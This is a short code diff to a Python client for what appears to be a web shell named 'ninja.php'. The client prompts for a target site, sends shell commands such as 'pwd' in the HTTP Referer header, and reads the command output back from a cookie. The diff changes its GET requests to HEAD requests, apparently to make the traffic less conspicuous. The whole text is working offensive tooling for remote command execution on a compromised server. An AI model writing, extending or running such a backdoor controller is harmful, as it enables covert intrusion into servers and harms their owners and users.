@@ -47,7 +47,7 @@ def main():
         main()
     else:
         try:
-            r=session.get(target, headers={"Referer":cmd})
+            r=session.head(target, headers={"Referer":cmd})
             print(unquote(r.cookies['x'].replace('+',' ')))
             main()
         except:
@@ -72,7 +72,7 @@ def getuser():
 def getcwd():
     global d
     global cwd
-    d = session.get(target, headers={"Referer":"pwd"})
+    d = session.head(target, headers={"Referer":"pwd"})
     cwd = unquote(d.cookies['x'].replace('+',' ')).strip()
 
 target = input("Target site (http://xxxxx.com/ninja.php) > ")
